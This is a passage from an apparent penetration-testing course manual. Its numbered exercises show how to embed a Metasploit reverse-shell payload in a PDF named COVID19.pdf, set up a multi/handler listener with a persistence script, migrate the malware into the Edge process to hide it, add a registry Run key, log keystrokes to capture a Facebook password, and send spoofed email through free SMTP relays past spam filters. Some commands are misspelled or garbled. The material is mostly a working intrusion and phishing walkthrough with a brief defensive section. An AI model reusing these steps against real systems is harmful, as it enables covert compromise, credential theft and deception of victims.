The file COVID19.pdf is the final embedded PDF file that when opened the
malware will automatically started and make a reverse connection to the Kali
machine.
19. In Kali we are going to setup msfconsole (Metasploit) to listen to
incoming connection from the victim machine that run the PDF
file. We are going to setup msfconsole to send persistence script to
the victim machine after the first connection established. The script
will change some Windows registry setting to make the malware
file independent from the PDF file and start automatically when the
Windows machine rebooted .
#msfconsole
Load msgrpc ( to use Kage as session GUI controller)
S_E_Oblako
#use exploit/multi/handler
#set PAYLOAD windows/mterpreter/revrese_tcp
#set LHOST 10.0.2.23
#set LPORT 4444
#Set ExitOnSession false
#set AutoRunScript exploits/windows/local/persistence LPORT=4444 (this
command to make the malware file persistence )
#exploit -j
S_E_Oblako
20. Go to Windows machine and open the PDF file, the reverse
connection will start to Kali
#sessions
#sessions 1
21. Start Kage and setup job to interact with the session
S_E_Oblako
22. Go back to Windows and close the PDF file, notice that the session
did not close.
23. Reboot Windows machine and monitor Kali msfconsole for new
S_E_Oblako
sessions ( to check the persistence module works)
24. Type >sessions
>Sessions 3
25. In Kage remove the old sessions and create new session because the
session number is change after the reboot.
26. To Clean up Windows 10 from the Malware persistence mode
delete the Jvb script located under
c:/Users/Administrator/AppData/local/Temp or use the provided
cleanup script
Meterpreter> resource >
Exercise 35 Embedding Malware inside image file
S_E_Oblako
Same procedure used to imbed a PDF file with malware, can be used to
embed an Image with malware.
1. Go through exercise 34, just replace the PDF file with an image.
6.8. Protecting against smart delivery methods
There are three ways to protect against smart backdoors delivery methods,
blocking or preventing Man in the Middle by using trusted networks, VPN
clients or using Xarp in systems, Xarp application that detect and ARP
poisoning, Xrap free version can be downloaded from
http://www.xarp.net/#download
Only use https connections to websites as they are encrypted and cannot be
patched in the fly.
Use hashing, hashing is a file signature that the file you downloaded into
your machine is the same file that the publisher has in his website and not
changed in the way, normally file publisher have file hash published in their
website beside the file name to be downloaded.
When you download a file and before running the file into your machine
generate the file hash and compare it to the hash number published in the
owner website, if the two numbers are identical then the file is save and did
not changed in the way if they do not match then the file is not save.
Generating hash can have done through command line or their GUI tool that
available on the internet.

Post
Exploitation
As the term suggests, post exploitation basically means the phases
of operation once a victim's system has been compromised by the
attacker. The value of the compromised system is determined by
the value of the actual data stored in it and how an attacker may
make use of it for malicious purposes. This phase deals with
collecting sensitive information, documenting it, and having an
idea of the configuration settings, network interfaces, and other
communication channels. These may be used to maintain persistent
access to the system as per the attacker's needs.
S_E_Oblako
7. Post exploitation
Post exploitation is that after the attacker gain access to the victim computer
using backdoor program or another method, he will try to have full control of
the victim PC by reading, copying, writing or deleting files and running PC
peripherals like Camera , mic , ..etc. In this section we have exercise to
create backdoor file using Veil and then using Metasploit console to listen to
the request to connect coming from the backdoor file when it is delivered to
the victim PC, for testing purposes we are going to use same file created in
exercise 32 and the same basic delivery method which was through Kali
website.
7.1.Metasploit meterpreter commands
Exercise 36: Post Exploitation
1. Start Kali Machine
2. Check the port used in the backdoor file that created by Viel in
Exercise 32
3. In Kali start webserver apache2
#service apache2 start
4. Setup Kali to listen to connection
S_E_Oblako
5. Start windows machine
6. Access the Kali website that contain the backdoor file from exercise
32
7. In windows Run the file downloaded from Kali website.
8. Looking at Kali listener you will see the connection established and
you have meterpreter session
9. To see all possible commands that we can run in the victim machine
run command
S_E_Oblako
meterpreter>help
meterpreter>background
10. The background command makes the backdoor running in the
background.
meterpreter>sessions
show currently running sessions
11. to interact with the session, you need to write command
>sessions 1 ( to connect back to the session )
12. meterpreter>ipconfig (which will show Windows network
configurations)
S_E_Oblako
7.2. Process impersonation
Metasploit meterpreter can change the process ID of the malware software to
take another Windows process ID. This will make the malware more
deceiving when someone look at Windows running processes.
meterpreter>ps
ps command will list all running processes in the target computer
S_E_Oblako
As we can see that Microsoft Edge process ID is 816
meterpreter>migrate 816
The command migrate will allow us to migrate the backdoor process to use
MicrosoftEdgeCP.exe process number 816 which is the process ID for Edge
to be less subspecies to the victim machine
Notes
You can migrate to any process in Windows, but the
best process to migrate to, is Edge.exe because it is
always used and not suspicious and have a full
control in the Windows machine.
If you look at Windows Resource Monitor under
Network, you can see that the exploit process using
explorer to connect to Kali machine.
S_E_Oblako
7.3. Controlling Victim file system
After getting connected to victim machine through Metasploit msfconsole,
meterpreter will allow a full control of the machine file system and should be
able to browse all files and directories and download, upload, delete, write
files and running new processes.
Exercise 37: Controlling victim file system
1. Meterpreter allows us to control the victim machine and navigate
through its files and directories, we can also download and upload from
the machine.
2. Here is a list of file system commands that I can run in the victim
machine
S_E_Oblako
3. Download a file from victim machine through meterpreter command
S_E_Oblako
4. See the file in Kali machine under /root
S_E_Oblako
Note
To deal with Windows files or folders names that have space
put the name between single quotation marks ‘xxxx xxxx’ .
5. Meterpreter allow to get direct Windows shell.
To switch back to meterpreter hit Control + C
7.4. Maintaining Access
The connections to the victim machine explained above is not persistence and
the connection will stop when the Victim machine is rebooted. The backdoor
file will not start by itself again. In this section we will create persistence
connection that once the backdoor installed it will try to connect to the Attack
machine (Kali) automatically every time the Windows machine started. We
are going to do this by injecting the backdoor as a service.
Exercise 38: Maintaining Access using persistence mode
6. Disconnect previous sessions and restart MSF console again
S_E_Oblako
7. Setup Listener connection again with persistence mode (see commands
in the screenshot below)
8. Go to windows machine and run the malware file again, and watch
msfconsole output
S_E_Oblako
9. The screenshot above is from msfconsole when the incoming connection
from Windows machine is detected , msfconsole it will do the following
actions automatically
- Meterpreter session is established between Kali and windows
machine.
- Starting persistence mode.
- Meterpreter will write a Visual Basic script (JVB ) to windows and
store it under c:\windows\temp
- Meterpreter will install Windows registry key to automatically
starting the JVB script , the Registry key :
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\cnPksfSWgN
(the last name is automatically changed by the script )
5. In Kali exit Msfconsole , and run it again and setup listener to
listen to connection without persistence commands
S_E_Oblako
6. Restart Windows Machine
7. Connection will be established automatically
8. Cleaning script to undo the persistence mode is stored in Kali under
/root/.msf4/logs/persistence//Name_of session.rc
9. To clean up just run the command Resource from meterpreter
followed by the location of the rc file.
7.5. Key-logger and screenshots
Using meterpreter you can capture screenshots from the victim PC and all
keys typed by the victim even passwords.
Exercise 39: Setting up Key-logger
1. This exercise is based on exercise 38 with the backdoor is running
on the victim machine and already connected to Kali machine.
2. Depending on the backdoor file that explained in the previous
section and running meterpreter you can capture keys from the
victim machine as follow:
S_E_Oblako
#meterpreter> keyscan_start
3. Go to Windows machine and try to login to Facebook or do any
activity
4. Comeback to Kali and type:
#meterpreter> keyscan_dump
5. You will see the keys that entered in the Windows machine
6. The facebook user name PI:EMAIL and the password
is facebook passord
7. Stop Key scan
#meterpreter> keyscan_stop
8. To see screenshot from the victim machine

Social
Engineering
Hackers use social engineering tactics because it is usually easier to
exploit your natural inclination to trust than it is to discover ways
to hack your software. For example, it is much easier to fool
someone into giving his password than trying to hack the system
and extracting his password (unless the password is weak).
Security is all about knowing who and what to trust. It is important
to know when and when not to take a person at their word and if
the person you are communicating with is who they say they are.
No matter how many locks and deadbolts are on your doors, if you
trust the person at the gate who says he is a pizza delivery guy and
you open the door for him without checking, you are completely
exposed to whatever risk he represent.
S_E_Oblako
Social Engineering depended on information gathering, in this
section, we are going to use Social Engineering tools to gather
information about victims and also we are going to use Kali
sendmail option with SMTP relay to send spoofed emails to
victims.
S_E_Oblako
8. Social Engineering
Social Engineering depend on information gathering about the target,
whether the target is a person, a company, or a web site. The methods of
information gathering do not need to be close to the target and use techniques
such as man in the middle. The type of information that gathered about the
target is their Facebook, LinkedIn, Google accounts, their friends, what web
sites that usually visit and more. After gathering information about the
target, then the attacker will build strategy on how to gain access to that
target either by gaining their trust and send them a backdoor software or by
making them reveal their account password. There are many ways to gather
information about a person or an entity, some are free tools available through
the internet such as Google Dorks, other tools that is come preloaded with
Kali such as Recon-ng.
After gathering information Hackers will start building strategy to attack the
victim, which could be an email from a friend or other trusted source. Taking
advantage of the trust and curiosity, the message of the email may contain a
link that you just have to check out–and because the link comes from a friend
and you’re curious, you’ll trust the link and click on it –and be infected with
malware so the Hacker can take over your machine and collect your contacts
info and deceive them just like you were deceived. Or a message that contain
compelling story that your ‘friend’ is stuck in country X and he lost all his
money and need you to send him money.
Also, Social Engineering may take a form of bait, these social engineering
schemes know that if you dangle something people want, many people will
take the bait. These schemes are often found on Peer-to-Peer sites offering a
download of something like a new movie, or music or software with ‘Crack’.
8.1. Maltego
Maltego is a cross platform application, for performing link analysis.
Discover relationships between entities and build a visual representation of
different data with a graph-based layout. A transform is a process that pulls
new data related to the entity, automatically extending the graph.
Maltego is commonly used for reconnaissance in penetration testing
engagement and open source intelligence analysis. It is possible to understand
the relationship between infrastructure services and even users when
mapping an organization’s attack surface.
There are two types of Transforms within Maltego, one runs on servers
S_E_Oblako
remotely the other can run locally on the system running Maltego.
Maltego comes installed in Kali Linux , you just need to register the first time
you run the tools in order to get the license
Exercise 40: Running Maltego Tool
1. In Kali, go to applications and run Maltego
2. Click on Maltego CE (Free)
S_E_Oblako
3. Choose to register and enter email address and password, an Email
will be sent to you to activate your Maltego account.
4. Start Maltego and choose to update the tool if there is update.
S_E_Oblako
5. After update is done choose to install Free API, every API there is a
description of the function that API such as querying specific
Database.
6. Some APIs require a key, you need to register with the site
mentioned in the API and they will email you the key.
S_E_Oblako
7. Click on the Plus sign at the top of Malteg.
8. Choose what you want to search for from the left side pane – for
example choose domain – drag and drop in the middle area
S_E_Oblako
9. Right click the domain and click on run all transforms
10. Click run
S_E_Oblako
11. Maltego will use the installed transforms to do a search about the
domain you entered and display a visual links about the found
information. You can verify every link and what kind information it
provided, and you can do deep search in the item found.
12. You can use other tools to help you further know more about the
found items for example you can use Shodan to find out more
inform about a device, if there is a link found, use the web browser
to see the content of that link.
8.2. Email spoofing
Email spoofing is the most used method of delivering malware,
hacking or deceiving other people by sending them email that look
like it is coming from someone they know and embed that email
with a backdoor or a link to harmful website, or a picture that
contain embedded malware that will automatically works when the
picture viewed.
This method depends on information gathering. When targeting a
victim, adversaries will gather information about the victim from
social media and other tools to know his friends, colleagues or
companies he is associated with and try to send him email that looks
like from a colleague or a friend.
Email Spoofing is particularly important in Penetration testing
because it is one of the tactics used to see if the company employees
S_E_Oblako
will be spoofed and give away valuable information just because
they received and email from someone looks legitimate.
There are many ways to send spoofed email, as there are many web
sites offers free spoofed email service, just google for “spoof email
online”. Most of the servers that delivering this service is known to
SPAM blockers and emails from them will be blocked or will end
up in the SPAM directory of this person.
To bypass this problem is either you make your own email server if
you have web hosting plan or sign up for a web hosting and create
your email server and use that to send fake emails.
Or you can sign up for SMTP relay server or a mail server. There
are many websites offer paid SMTP services that you are going to
get a good result because they are used by actual marketers or actual
advertising companies to send email.
Here is a list of best Free SMTP servers that can be used to sed
emails:
SendinBlue over 9000 Free emails per month (
https://www.sendinblue.com/)
Constant Contact ( https://www.constantcontact.com)
Elastic Email (https://www.elasticemail.com)
And there are more free or for a low fee SMTP relay servers
including google Gmail SMTP , MailGun, SendGarid.
Exercise 41: Email Spoofing using Sendinblue server
1. Go to https://sendinblue.com
2. Sign up
3. A confirmation email will be sent to your email where you can finish
up registration
S_E_Oblako
4. Click on Transaction tap to see the authentication information that
needed to send emails
The information in this page will be used in Kali #sendemail tool , the SMTP
S_E_Oblako
server , port, login and password.
5. Open Kali terminal windows
#sendemail --help
S_E_Oblako
#sedemail -xu  -xp  -
stem.relay.server_name:port number -f  -
t  -u  -m  -o
6. Use #sendemail command as explained in the above screenshot.
7. This is how is the message going to look in Gmail when it arrive to
the victim email
8. And in office 365 as following screenshot
Note
Most of email servers that uses blacklist services will detect the email from
sendinblue and other free SMTP relay services as spam or promotion because
Anti-Spam vendors will blacklist such services. In exercise above the Gmail
list the mail under Promotion folder and Office 365 show that the email came
